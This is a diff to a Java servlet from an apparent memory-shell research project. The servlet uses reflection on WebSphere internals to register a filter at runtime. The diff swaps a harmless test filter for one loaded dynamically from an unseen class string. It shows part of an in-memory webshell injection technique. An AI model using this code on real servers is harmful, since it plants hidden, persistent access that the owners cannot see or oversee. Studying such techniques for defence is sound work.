@@ -1,15 +1,19 @@
 package org.su18.memshell.test.websphere;
 
-import javax.servlet.*;
+import javax.servlet.DispatcherType;
+import javax.servlet.Filter;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletRequestWrapper;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.EnumSet;
 import java.util.List;
+
+import static org.su18.memshell.test.websphere.DynamicUtils.FILTER_CLASS_STRING;
 
 /**
  * 来自项目 https://github.com/feihong-cs/memShell
@@ -63,7 +67,7 @@ public class AddWebsphereFilter extends HttpServlet {
 			//如果已存在同名的 Filter，就不在添加，防止重复添加
 			if (!flag) {
 
-				Filter filter = new TestFilter();
+				Filter filter = (Filter) DynamicUtils.getClass(FILTER_CLASS_STRING).newInstance();
 
 				Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
 				filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});
@@ -110,62 +114,4 @@ public class AddWebsphereFilter extends HttpServlet {
 			e.printStackTrace();
 		}
 	}
-
-	public static class TestFilter implements Filter {
-
-		/**
-		 * 初始化 filter
-		 *
-		 * @param filterConfig FilterConfig
-		 */
-		@Override
-		public void init(FilterConfig filterConfig) {
-		}
-
-		/**
-		 * doFilter 方法处理过滤器逻辑
-		 *
-		 * @param servletRequest  ServletRequest
-		 * @param servletResponse ServletResponse
-		 * @param filterChain     FilterChain
-		 * @throws IOException      抛出异常
-		 * @throws ServletException 抛出异常
-		 */
-		@Override
-		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-			// 给下一个过滤器
-			filterChain.doFilter(new AddWebsphereFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
-		}
-
-		/**
-		 * 销毁时执行的方法
-		 */
-		@Override
-		public void destroy() {
-		}
-
-		/**
-		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
-		 */
-		class FilterRequest extends HttpServletRequestWrapper {
-
-			public FilterRequest(HttpServletRequest request) {
-				super(request);
-			}
-
-			@Override
-			public String getParameter(String name) {
-				if ("id".equals(name)) {
-					String originalId = super.getParameter(name);
-
-					if (originalId != null && !originalId.isEmpty()) {
-						int idNum = (Integer.parseInt(originalId) * 15);
-						return Integer.toString(idNum);
-					}
-				}
-				return super.getParameter(name);
-			}
-		}
-	}
-
 }
